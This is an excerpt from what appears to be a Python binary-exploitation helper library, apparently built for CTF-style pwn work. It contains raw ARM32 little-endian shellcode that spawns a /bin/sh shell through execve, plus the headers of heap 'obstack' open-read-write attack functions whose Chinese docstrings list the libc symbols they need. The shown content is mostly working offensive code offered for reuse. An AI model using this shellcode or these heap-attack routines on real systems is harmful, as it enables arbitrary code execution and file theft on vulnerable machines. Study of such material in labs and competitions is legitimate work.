...
def shellcode_store(demand, *args):
    ...
    elif demand == 'arm32_little_shell':
	 shellcode = b"\x2f\x53\x07\xe3\x68\x50\x40\xe3\x04\x50\x2d\xe5\x2f\x52\x06\xe3\x69\x5e\x46\xe3\x04\x50\x2d\xe5\x0d\x00\xa0\xe1\x0b\x70\xa0\xe3\x00\x10\xa0\xe3\x00\x20\xa0\xe3\x00\x00\x00\xef"
...
def obstack_orw1_attack(heap_addr:int,libc_symbols_address:list)->bytes:
    '''
    传入的参数字典所需的符号为：
    open;read;write 
...
def obstack_orw2_attack(heap_addr,libc_symbols_address)->bytes:
    '''
    传入的参数字典所需的符号为：
